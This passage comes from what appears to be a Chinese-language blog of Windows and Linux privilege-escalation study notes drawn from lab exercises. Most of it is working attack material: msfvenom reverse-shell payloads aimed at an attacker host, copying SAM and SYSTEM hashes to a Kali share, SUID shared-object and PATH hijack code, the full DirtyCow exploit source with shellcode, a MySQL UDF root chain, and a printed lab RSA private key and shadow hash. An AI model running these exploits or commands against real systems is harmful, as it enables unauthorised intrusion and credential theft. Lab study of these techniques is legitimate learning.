successfully.\n\nc:\\PrivEsc>net start regsvc\n```\n\n![image-20220525161239852](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/39fc57f8b8573a03ccec233bdf8d2508.png)\n\n![image-20220525160834061](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/ab3f8349b152183e2539681d696b96e4.png)\n\n\n\n) 4 - 不安全的服务可执行文件\n\n![image-20220525172553728](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/52fea3bae7978fd98b73f0e2dbc58208.png)\n\n```cmd\n# 查询“ filepermsvc” 服务\nsc qc filepermsvc\t\n\n# 使用 accesschk.exe，请注意服务二进制文件 (BINARY_PATH_NAME) 文件对所有人都是可写的\nC:\\PrivEsc\\accesschk.exe /accepteula -quvw \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\"\t\n\n#复制您创建的 reverse.exe 可执行文件并用它替换 filepermservice.exe\ncopy C:\\PrivEsc\\reverse.exe \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\" /Y\t\n\n#在 Kali 上启动一个侦听器，然后启动该服务以生成一个以 SYSTEM 权限运行的反向 shell\nnet start filepermsvc\t\n```\n\n\n\n![image-20220525170550784](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/47171d740657bddbecb10891e9ccb724.png)\n\n\n\n### #3 注册表\n\nAutoRuns\n\n![image-20220525172120597](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/4013f1d706346cb30c0572dc764146ba.png)\n\n```cmd\n# 在注册表中查询 AutoRun 可执行文件：\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\n# 使用 accesschk.exe，请注意其中一个 AutoRun 可执行文件对每个人都是可写的：\nC:\\PrivEsc\\accesschk.exe /accepteula -wvu \"C:\\Program Files\\Autorun Program\\program.exe\"\n\n#复制您创建的 reverse.exe 可执行文件 并用它覆盖 AutoRun 可执行文件：\ncopy C:\\PrivEsc\\reverse.exe \"C:\\Program Files\\Autorun Program\\program.exe\" /Y\n\n# 在现实世界中，您必须等待管理员自己登录！\n```\n\n![image-20220525172846079](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/63181b75ba68f796efa8a6b2515bf785.png)\n\n\n\n\n\nAlwaysInstallElevated\n\n![image-20220525175002143](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/8ad5f98a706e1a198f8772eeca3dcc79.png)\n\n```cmd\n# 在注册表中查询 AlwaysInstallElevated 键：\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# 请注意，两个键都设置为 1 (0x1)。\n\n#在Kali上，使用msfvenom生成反向shell Windows Installer (reverse.msi)。更新LHOST IP地址：\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.53.68 LPORT=53 -f msi -o reverse.msi\n\n# 将 reverse.msi 文件传输到 Windows 上的 C:\\PrivEsc 目录（使用之前的 SMB 服务器方法）。\ncopy \\\\10.11.53.68\\share\\reverse.msi c:\\PrivEsc\\reverse.msi\n\n#在 Kali 上启动一个监听器，然后运行安装程序以触发以 SYSTEM 权限运行的反向 shell：\nmsiexec /quiet /qn /i C:\\PrivEsc\\reverse.msi\n```\n\n![image-20220525220104009](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/1271cee0aab41beea675ef6944e20854.png)\n\n\n\n### #4 密码\n\n) 1 - 注册表\n\n![image-20220525224435116](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/37751d916149b6850e2175cb41a49ccd.png)\n\n```bash\n# 可以在注册表中搜索包含password一词的键和值：\nreg query HKLM /f password /t REG_SZ /s\n\n# 如果您想节省一些时间，请查询此特定密钥以查找管理员 AutoLogon 凭据：\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\winlogon\"\n```\n\n\n\n) 2 - 保存的凭据\n\n![image-20220526095216760](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/ba4a9b1e8a0531ef4126f7a4a82384f5.png)\n\n如果winPEASany没用出结果需要手动输入命令\n\n```bash\n# 列出所有保存的凭据：\ncmdkey /list\n\n# 在 Kali 上启动一个侦听器并使用 runas 和管理员用户保存的凭据运行 reverse.exe 可执行文件：\nrunas /savecred /user:admin C:\\PrivEsc\\reverse.exe\n```\n\n![image-20220525224203673](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/d9bce80d8228f9b81143e689edf77e1c.png)\n\n\n\n) 3 - 安全帐户管理器 (SAM)\n\n![image-20220526095641426](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/20932fa6cdcd4377abf093d39200189b.png)\n\n```cmd\n# 将 SAM 和 SYSTEM 文件传输到您的 Kali VM：\ncopy C:\\Windows\\Repair\\SAM \\\\10.10.10.10\\kali\\\ncopy C:\\Windows\\Repair\\SYSTEM \\\\10.10.10.10\\kali\\\n\n# 在 Kali 上，克隆 creddump7 存储库（Kali 上的存储库已过时，无法正确转储 Windows 10 的哈希值！）并使用它从 SAM 和 SYSTEM 文件中转储哈希值：\ngit clone https://github.com/Tib3rius/creddump7\npip3 install pycrypto\npython3 creddump7/pwdump.py SYSTEM SAM\n\n# 使用 hashcat 破解管理员 NTLM 哈希：\nhashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt\n```\n\n![image-20220526102104852](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/c92ecf92f8e5569c5323adabf5809a9b.png)\n\n\n\n### #5 计划任务\n\n```cmd\nschtasks /query /fo LIST /v\t\t# 任务列表\nschtasks /query /fo LIST /v | find \"Task To Run\"\t# 过滤运行的任务文件\n\n#查看 C:\\DevTools\\CleanUp.ps1 脚本的内容：\ntype C:\\DevTools\\CleanUp.ps1\n\n#该脚本似乎每分钟都以 SYSTEM 身份运行。使用 accesschk.exe，请注意您可以写入此文件：\nC:\\PrivEsc\\accesschk.exe /accepteula -quvw user C:\\DevTools\\CleanUp.ps1\n\n# 在 Kali 上启动一个侦听器，然后将一行添加到C:\\DevTools\\CleanUp.ps1 运行您创建的 reverse.exe 可执行文件：\necho C:\\PrivEsc\\reverse.exe >> C:\\DevTools\\CleanUp.ps1\n\n# 等待计划任务运行，这将触发反向 shell 作为 SYSTEM。\n```\n\n![image-20220526133707718](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/9989b9141ca55268a1eeeb1a412859e2.png)\n\n![image-20220526135208329](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/dc24843955a002b9ad56bb9a70315600.png)\n\n\n\n### #6 不安全的 GUI 应用程序\n\n```cmd\n# 桌面上有个画图程序，运行程序后输入\ntasklist /V | findstr mspaint.exe\n\n# 双击桌面上的“AdminPaint”快捷方式。运行后，打开命令提示符并注意 Paint 正在以管理员权限运行：\ntasklist /V | findstr mspaint.exe\n\n# 在画图中，单击“文件”，然后单击“打开”。在打开文件对话框中，点击导航输入并粘贴：\nfile://c:/windows/system32/cmd.exe\n\n# 按 Enter 以生成以管理员权限运行的命令提示符。\n```\n\n![image-20220526142759387](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/2a64c0e29ab5bb88586dc010724b0951.png)\n\n![image-20220526142549020](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/a39d6cd030126322c919f8468309d5b4.png)\n\n\n\n### #7 Startup 应用程序\n\n![image-20220526143354340](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/c6518526f2446bd09afb7591efc300df.png)\n\n```cmd\n# 使用 accesschk.exe，注意 BUILTIN\\Users 组可以将文件写入 StartUp 目录：\nC:\\PrivEsc\\accesschk.exe /accepteula -d \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"\n\n#使用 cscript，运行 C:\\PrivEsc\\CreateShortcut.vbs 脚本，该脚本应该在 StartUp 目录中为您的 reverse.exe 可执行文件创建一个新的快捷方式：\ncscript C:\\PrivEsc\\CreateShortcut.vbs\n\n# 在 Kali 上启动一个监听器，然后等待管理员登录：\n# 以管理员身份运行的 shell 应连接回您的侦听器。\n```\n\n![image-20220526143837667](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/76b70937c6087bacf08298ad02874238.png)\n\n\n\n### #8 令牌模拟\n\n) 1 - Rogue Potato(流氓土豆)\n\n参考文章 : https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#roguePotato\n\n利用详情 : https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html\n\nTools : https://github.com/antonioCoco/RoguePotato\n\n* 本地服务权限账户\n* 启用 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege \n\n```cmd\n# 在您的机器上运行socat重定向（替换VICTIM_IP）：\nsocat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999\nsudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.79.228:9999\n\n# 执行 PoC（替换YOUR_IP和command）：\n.\\RoguePotato.exe -r YOUR_IP -e \"command\" -l 9999\nC:\\PrivEsc\\RoguePotato.exe -r 10.11.53.68 -e \"C:\\PrivEsc\\reverse.exe\" -l 9999\n```\n\n![image-20220527103837310](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/d5a9584af9cce73c8a057da880b93a74.png)\n\n\n\n) 2 - PrintSpoofer\n\n漏洞详细 ： https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/\n\nTools : https://github.com/itm4n/PrintSpoofer\n\n* 需要本地服务或网络服务访问\n* 启用 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege\n\n![image-20220527144905068](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/e9690c18d01909d08110e64e6fd33273.png)\n\n\n\n","tags":["提权"]},{"title":"Linux Privesc","url":"/2022/11/07/Linux-Privesc/","content":"\n### #0 枚举脚本\n\n**linpeas.sh：**https://github.com/carlospolop/PEASS-ng\n\n**LinEnum：**https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh\n\n**lse.sh：**https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh\n\n***\n\n\n\n### #1 滥用 SUID/GUID 文件\n\n- 查疑似漏洞\n\n```bash\n$ find / -perm -u=s -type f 2>/dev/null\n$ find / -perm -4000  2>/dev/null\n$ find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null\n```\n\n- exim提权\n\n```bash\nuser@debian:~$ find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null\n......\n-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3\t#exim 可以提权\n......\n$ searchsploit -m 39535\n```\n\n- SUID-共享对象注入\n\n```bash\nuser@debian:~$ find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null\n......\n-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so\t#可执行文件容易受到共享对象注入的影响\n......\nuser@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE \"open|access|no such file\"\t    #对文件运行strace并在输出中搜索打开/访问调用和“没有这样的文件”错误\naccess(\"/etc/suid-debug\", F_OK)         = -1 ENOENT (No such file or directory)\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\naccess(\"/etc/ld.so.preload\", R_OK)      = -1 ENOENT (No such file or directory)\nopen(\"/etc/ld.so.cache\", O_RDONLY)      = 3\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nopen(\"/lib/libdl.so.2\", O_RDONLY)       = 3\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nopen(\"/usr/lib/libstdc++.so.6\", O_RDONLY) = 3\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nopen(\"/lib/libm.so.6\", O_RDONLY)        = 3\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nopen(\"/lib/libgcc_s.so.1\", O_RDONLY)    = 3\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nopen(\"/lib/libc.so.6\", O_RDONLY)        = 3\nopen(\"/home/user/.config/libcalc.so\", O_RDONLY) = -1 ENOENT (No such file or directory)\t\t#请注意，可执行文件尝试在我们的主目录中加载/home/user/.config/libcalc.so共享对象，但找不到它\n\nuser@debian:~$ cat /home/user/tools/suid/libcalc.c\t\t#libcalc.c 源码\n#include <stdio.h>\n#include <stdlib.h>\n\nstatic void inject() __attribute__((constructor));\n\nvoid inject() {\n\tsetuid(0);\n\tsystem(\"/bin/bash -p\");\n}\n\n$ mkdir /home/user/.config\t\t#为 libcalc.so 文件创建.config目录\n$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c\t#将代码编译到suid-so可执行文件所在位置的共享对象中\n$ /usr/local/bin/suid-so\t#执行suid-so可执行文件\nCalculating something, please wait...\nbash-4.1# id\nuid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\n```\n\n- SUID-环境变量\n\n```bash\n#/usr/local/bin/suid-env可执行文件可以被利用，因为它继承了用户的 PATH 环境变量并尝试在不指定绝对路径的情况下执行程序\nuser@debian:~$ find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null\n......\n-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env\t\n......\n\nuser@debian:~$ /usr/local/bin/suid-env\t#执行该文件并注意它似乎正在尝试启动apache2网络服务器\n[....] Starting web server: apache2httpd (pid 1623) already running\n. ok \n\nuser@debian:~$ strings /usr/local/bin/suid-env\t#strings在文件上运行字符串以查找可打印字符的字符串\n.....\nfff.\nfffff.\nl$ L\nt$(L\n|$0H\nservice apache2 start\t#一行（“service apache2 start”）表明正在调用服务可执行文件来启动网络服务器，但未使用可执行文件的完整路径（/usr/sbin/service）。\n\nuser@debian:~$ cat /home/user/tools/suid/service.c\t#service.c源码\nint main() {\n\tsetuid(0);\n\tsystem(\"/bin/bash -p\");\n}\n\nuser@debian:~$ gcc -o service /home/user/tools/suid/service.c\t#编译\nuser@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env\t#将当前目录（或新服务可执行文件所在的位置）添加到 PATH 变量中，然后运行suid-env可执行文件以获得 root shell\nroot@debian:~# id\nuid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n```\n\n- SUID-滥用Shell功能\n\n```bash\n#/usr/local/bin/suid-env2 可执行文件与 /usr/local/bin/suid-env 相同，只是它使用服务可执行文件 (/usr/sbin/service) 的绝对路径来启动 apache2 网络服务器。\nuser@debian:~$ find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null\n......\n-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2\n......\n\nuser@debian:~$ strings /usr/local/bin/suid-env2\t\t#strings在文件上运行字符串以查找可打印字符的字符串\n......\nfff.\nfffff.\nl$ L\nt$(L\n|$0H\n/usr/sbin/service apache2 start\t\t#可执行文件 (/usr/sbin/service) 的绝对路径来启动 apache2 网络服务器\n\n#在Bash版本<4.2-048，可以定义名称类似于文件路径的 shell 函数，然后导出这些函数，以便使用它们而不是该文件路径中的任何实际可执行文件。\nuser@debian:~$ /bin/bash --version\t\t#查看Bash版本\nGNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)\nCopyright (C) 2009 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\n\nThis is free software; you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\n\n#创建一个名为“ /usr/sbin/service ”的 Bash 函数，该函数执行一个新的 Bash shell（使用 -p 以保留权限）并导出该函数\nuser@debian:~$ function /usr/sbin/service { /bin/bash -p; } \nuser@debian:~$ export -f /usr/sbin/service\nuser@debian:~$ /usr/local/bin/suid-env2\t\t#运行suid-env2可执行文件以获取 root shell\nroot@debian:~# id\nuid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\n```\n\n***\n\n\n\n### #2 sudo提权\n\nhttps://gtfobins.github.io/\n\n```bash\nsudo -l\n```\n\n***\n\n\n\n### #3 内核提权\n\n**枚举脚本：**\n\nhttps://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh\n\nhttps://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl\n\n- dirctycow(脏牛提权 exp)\n\n```c\nuser@debian:~/tools/kernel-exploits$ cat /home/user/tools/kernel-exploits/dirtycow/c0w.c\n/*\n* A PTRACE_POKEDATA variant of CVE-2016-5195\n* should work on RHEL 5 & 6\n* \n* (un)comment correct payload (x86 or x64)!\n* $ gcc -pthread c0w.c  -o c0w\n* $ ./c0w\n* DirtyCow root privilege escalation\n* Backing up /usr/bin/passwd.. to /tmp/bak\n* mmap fa65a000\n* madvise 0\n* ptrace 0\n* $ /usr/bin/passwd \n* [root@server foo]# whoami \n* root\n* [root@server foo]# id\n* uid=0(root) gid=501(foo) groups=501(foo)\n* @KrE80r\n*/\n#include <fcntl.h>\n#include <pthread.h>\n#include <string.h>\n#include <stdio.h>\n#include <stdint.h>\n#include <sys/mman.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <sys/wait.h>\n#include <sys/ptrace.h>\n#include <unistd.h>\n\nint f;\nvoid *map;\npid_t pid;\npthread_t pth;\nstruct stat st;\n\n// change if no permissions to read\nchar suid_binary[] = \"/usr/bin/passwd\";\n\n/*\n* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i\n*/ \nunsigned char shell_code[] = {\n  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,\n  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,\n  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,\n  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,\n  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,\n  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05\n};\nunsigned int sc_len = 177;\n\n/*\n* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i\nunsigned char shell_code[] = {\n  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,\n  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,\n  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,\n  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,\n  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,\n  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,\n  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,\n  0x89, 0xe1, 0xcd, 0x80\n};\nunsigned int sc_len = 136;\n*/\n\nvoid *madviseThread(void *arg) {\n  int i,c=0;\n  for(i=0;i<200000000;i++)\n    c+=madvise(map,100,MADV_DONTNEED);\n  printf(\"madvise %d\\n\\n\",c);\n}\n\n\nint main(int argc,char *argv[]){\n\n  printf(\"                                \\n\\\n   (___)                                   \\n\\\n   (o o)_____/                             \\n\\\n    @@ `     \\\\                            \\n\\\n     \\\\ ____, /%s                          \\n\\\n     //    //                              \\n\\\n    ^^    ^^                               \\n\\\n\", suid_binary);\n  char *backup;\n  printf(\"DirtyCow root privilege escalation\\n\");\n  printf(\"Backing up %s to /tmp/bak\\n\", suid_binary);\n  asprintf(&backup, \"cp %s /tmp/bak\", suid_binary);\n  system(backup);\n\n  f=open(suid_binary,O_RDONLY);\n  fstat(f,&st);\n  map=mmap(NULL,st.st_size+sizeof(long),PROT_READ,MAP_PRIVATE,f,0);\n  printf(\"mmap %x\\n\\n\",map);\n  pid=fork();\n  if(pid){\n    waitpid(pid,NULL,0);\n    int u,i,o,c=0,l=sc_len;\n    for(i=0;i<10000/l;i++)\n      for(o=0;o<l;o++)\n        for(u=0;u<10000;u++)\n          c+=ptrace(PTRACE_POKETEXT,pid,map+o,*((long*)(shell_code+o)));\n    printf(\"ptrace %d\\n\\n\",c);\n   }\n  else{\n    pthread_create(&pth,\n                   NULL,\n                   madviseThread,\n                   NULL);\n    ptrace(PTRACE_TRACEME);\n    kill(getpid(),SIGSTOP);\n    pthread_join(pth,NULL);\n    }\n  return 0;\n}\n```\n\n![image-20220519152241925](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/faae7eb947602f5192ad9fbdec6c3652.png)\n\n***\n\n\n\n### #4 服务提权\n\n- Mysql UDF提权：https://www.exploit-db.com/exploits/1518\n\n\n```bash\nmysql> show global variables like \"secure%\";\t#查看是否有上传权限\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_auth      | OFF   |\n| secure_file_priv |       |\t#secure_file_priv值需要为空\n+------------------+-------+\n2 rows in set (0.00 sec)\n\n\n$ searchsploit -m 1518  #获取exp\n$ mv 1518.c raptor_udf2.c\t#重命名\n$ gcc -g -c raptor_udf2.c\t#编译\n$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc\n\n$ mysql -u root -p\t\t#登录Mysql\nmysql> use mysql;\nmysql> create table foo(line blob);\nmysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));\t#记得修改路径\nmysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';\nmysql> create function do_system returns integer soname 'raptor_udf2.so';\nmysql> select * from mysql.func;\nmysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');\nmysql> exit\n$ /tmp/rootbash -p\t\t#退出mysql后执行命令\n\nrootbash-4.1# id\nuid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\nrm /tmp/rootbash  #请记住删除修改后的代码，删除 /tmp/rootbash 可执行文件并退出提升的 shell，然后再继续，因为稍后您将在房间中再次创建此文件！\nexit\n\n```\n\n***\n\n\n\n### #5 密码&密钥\n\n-  历史命令\n\n```bash\n$ cat ~/.*history\t\t\n```\n\n-  配置文件\n\n```bash\nuser@debian:~$ cat /home/user/myvpn.ovpn\nclient\n......\nremote-cert-tls server\nauth-user-pass /etc/openvpn/auth.txt\t#包含密码txt文件\t\ncomp-lzo\nverb 1\nreneg-sec 0\n\nuser@debian:~$ cat /etc/openvpn/auth.txt\nroot\npassword123\t\t#获取密码\n```\n\n-  SSH密钥\t(藏在根目录)\n\n```bash\nuser@debian:~$ ls  -la /.ssh\ntotal 12\ndrwxr-xr-x  2 root root 4096 Aug 25  2019 .\ndrwxr-xr-x 22 root root 4096 Aug 25  2019 ..\n-rw-r--r--  1 root root 1679 Aug 25  2019 root_key\nuser@debian:~$ cat /.ssh/root_key \n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm\ngLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl\np4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo\nOHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD\neV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET\nZ36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2\nNiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ\nYaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+\n5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el\nWUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7\nVDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7\n6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW\n1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K\n824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6\nWg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc\nU7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1\nRg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi\nSXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV\nd+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im\njQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa\n871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok\nX2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4\nCLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN\nWhp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4\nLnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==\n-----END RSA PRIVATE KEY-----\n\n$ chmod 600 root_key\n$ ssh -i root_key root@10.10.63.222\n```\n\n- 查找/etc下的密码\n\n```bash\ncd /etc\ngrep -r password\n```\n\n\n***\n\n\n\n### #6 弱文件权限\n\n- shadow文件可读可写\n\n```bash\n#破解hash\n$ ls -l /etc/shadow\n-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow\t#文件可读可写\n\n$ cat /etc/shadow\nroot:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::\ndaemon:*:17298:0:99999:7:::\nbin:*:17298:0:99999:7:::\n\n$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\n#写入hash\n$ mkpasswd -m sha-512 